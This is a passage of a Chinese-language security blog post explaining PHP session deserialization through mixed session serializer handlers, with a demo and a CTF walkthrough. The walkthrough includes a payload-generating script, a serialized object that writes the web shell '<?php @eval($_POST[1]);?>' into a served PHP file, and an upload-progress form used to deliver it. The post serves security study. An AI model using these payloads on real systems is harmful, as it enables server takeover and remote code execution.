+<p>上面的解释可能看起来有些绕，简单来说<code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
+<p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
+<p>定义一个<code>session.php</code>文件，用于传入 <code>session</code>值，文件内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们传入hello,得到的session内容如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>新建一个class.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;panda&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> <span class="title class_">XianZhi</span>();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250925222825873.png" alt="image-20250925222825873"></p>
+<p>实例化对象后，输出了<code>panda</code></p>
+<p>这两个文件的作用很清晰，<code>session.php</code>文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的 <code>session</code>值，<code>class.php</code>文件的作用是在反序列化开始前输出<code>Who are you?</code>，反序列化结束的时候输出<code>name</code>值。</p>
+<p>这两个文件如果想要利用<code>php bug #71101</code>，我们要在<code>session.php</code>文件传入<code>|</code>+<code>序列化</code>格式的值，然后再次访问<code>class.php</code>文件的时候，就会在调用<code>session</code>值的时候，触发此 BUG。</p>
+<p>首先生成序列化字符串，利用 payload 如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$str</span> = <span class="keyword">new</span> <span class="title class_">XianZhi</span>();</span><br><span class="line">    <span class="variable">$str</span>-&gt;name = <span class="string">&quot;xianzhi&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后传入<code>session.php</code>,查看现在的session值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再次访问<code>class.php</code>文件的时候，就会发现已经触发了<code>php bug #71101</code>，如下图所示：</p>
+<p>遇到竖线 <code>|</code>，认为前面是键名，后面是值</p>
+<p><img src="/images/20191026143047-2590dbc6-f7ba-1.png" alt="20191026143047-2590dbc6-f7ba-1"></p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>2019 年巅峰极客大赛<code>lol</code></p>
+<p>只分析session反序列化部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├── app</span><br><span class="line">│   ├── controller</span><br><span class="line">│   │   ├── Files.class.php</span><br><span class="line">│   │   └── IndexController.class.php</span><br><span class="line">│   ├── model</span><br><span class="line">│   │   └── Download.class.php</span><br><span class="line">│   └── view</span><br><span class="line">│       └── Cache.class.php</span><br><span class="line">├── core</span><br><span class="line">│   ├── config.php</span><br><span class="line">│   ├── core.php</span><br><span class="line">│   └── func.php</span><br><span class="line">├── index.php</span><br><span class="line">├── upload</span><br><span class="line">│   └── e9ovitochivkoamlodj6vu9g7g</span><br><span class="line">└── user</span><br></pre></td></tr></table></figure>
+
+<p>在config.php文件中找到提示:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>=&gt;<span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ini&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;session.name&#x27;</span> =&gt; <span class="string">&#x27;PHPSESSID&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;session.serialize_handler&#x27;</span> =&gt; <span class="string">&#x27;php&#x27;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到php引擎是<code>php</code>,在&#x2F;core&#x2F;core.php中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;Core_DIR&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(Core_DIR.DS.<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(Core_DIR.DS.<span class="string">&#x27;func.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">_if_debug</span>(<span class="variable">$config</span>[<span class="string">&#x27;debug&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(<span class="string">&#x27;autoload_class&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">config</span>(<span class="variable">$config</span>[<span class="string">&#x27;ini&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;Upload_DIR&#x27;</span>,Image_DIR.DS.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line"><span class="title function_ invoke__">init</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">IndexController</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$app</span>, <span class="variable">$app</span>-&gt;data[<span class="string">&#x27;method&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$app</span>-&gt;&#123;<span class="variable">$app</span>-&gt;data[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$app</span>-&gt;data[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$app</span>-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#$this-&gt;method($_POST)</span></span><br></pre></td></tr></table></figure>
+
+<p>肯定是有地方读取了session,接下来寻找可控的session点.在<code>app/model/Cache.class.php</code>文件中找到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$html</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;name&#x27;</span>]=<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;post&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])?<span class="variable">$data</span>[<span class="string">&#x27;post&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;message&#x27;</span>]=<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;post&#x27;</span>][<span class="string">&#x27;message&#x27;</span>])?<span class="variable">$data</span>[<span class="string">&#x27;post&#x27;</span>][<span class="string">&#x27;message&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;image&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="string">&#x27;image&#x27;</span>])?<span class="variable">$data</span>[<span class="string">&#x27;image&#x27;</span>]:<span class="string">&#x27;/static/images/pic04.jpg&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path=Cache_DIR.DS.<span class="title function_ invoke__">session_id</span>().<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;html=<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; /&gt;&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/noscript.css&quot; /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class=&quot;is-preload&quot;&gt;&lt;div id=&quot;wrapper&quot;&gt;&lt;header id=&quot;header&quot;&gt; &lt;div class=&quot;logo&quot;&gt;&lt;span class=&quot;icon fa-diamond&quot;&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class=&quot;content&quot;&gt;&lt;div class=&quot;inner&quot;&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href=&quot;#you&quot;&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id=&quot;main&quot;&gt;&lt;article id=&quot;you&quot;&gt;    &lt;h2 class=&quot;major&quot; ng-app&gt;%s&lt;/h2&gt;    &lt;span class=&quot;image main&quot;&gt;&lt;img src=&quot;%s&quot; alt=&quot;&quot; /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type=&quot;button&quot; onclick=location.href=&quot;/download/%s&quot;&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id=&quot;footer&quot;&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/browser.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/breakpoints.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/util.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/main.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/angular.js&quot;&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;&#x27;</span>,<span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;data[<span class="string">&#x27;name&#x27;</span>],<span class="number">0</span>,<span class="number">62</span>),<span class="variable">$this</span>-&gt;data[<span class="string">&#x27;image&#x27;</span>],<span class="variable">$this</span>-&gt;data[<span class="string">&#x27;message&#x27;</span>],<span class="title function_ invoke__">session_id</span>().<span class="string">&#x27;.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;path,<span class="variable">$this</span>-&gt;html))&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的name和message是可控的,然后将得到的内容传入到path中并且包含,payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="string">&#x27;/var/www/html/1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$html</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$str</span> = <span class="keyword">new</span> <span class="title class_">Cache</span>();</span><br><span class="line">    <span class="variable">$str</span>-&gt;data= [</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;panda&quot;</span>,</span><br><span class="line">    <span class="string">&quot;image&quot;</span> =&gt; <span class="string">&quot;panda&quot;</span></span><br><span class="line">];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到字符串:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Cache&quot;:4:&#123;s:4:&quot;data&quot;;a:3:&#123;s:4:&quot;name&quot;;s:16:&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;;s:7:&quot;message&quot;;s:5:&quot;panda&quot;;s:5:&quot;image&quot;;s:5:&quot;panda&quot;;&#125;s:2:&quot;sj&quot;;N;s:4:&quot;path&quot;;s:19:&quot;/var/www/html/1.php&quot;;s:4:&quot;html&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在前面<code>O</code>出加上<code>|</code>欺骗session反序列化引擎,当用默认php引擎读取是,<code>|</code>会将其后的 <code>O:5:&quot;Cache&quot;...</code>当作值反序列化。</p>
+<p>再建立up.html文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://10.37.14.49/1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;panda&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用来提交我们的payload,抓包,提交payload</p>
+<p><img src="/images/20191026143120-38e1af5c-f7ba-1.png" alt="20191026143120-38e1af5c-f7ba-1"></p>
+<p>由于请求后，<code>session</code>会立刻被清空覆盖,发到爆破模块发送NULL payload即可</p>
+<p>然后1.php就会被修改为</p>
+<p><img src="/images/20191026143204-5312300e-f7ba-1.png" alt="20191026143204-5312300e-f7ba-1"></p>
+<p>拿到shell后直接读flag即可</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># session 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/23/%E9%80%9A%E8%BE%BEOA11-9%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="通达OA11.9漏洞分析">
+                  <i class="fa fa-angle-left"></i> 通达OA11.9漏洞分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/09/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="phar反序列化">
+                  phar反序列化 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hllttz</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">276k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:11</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
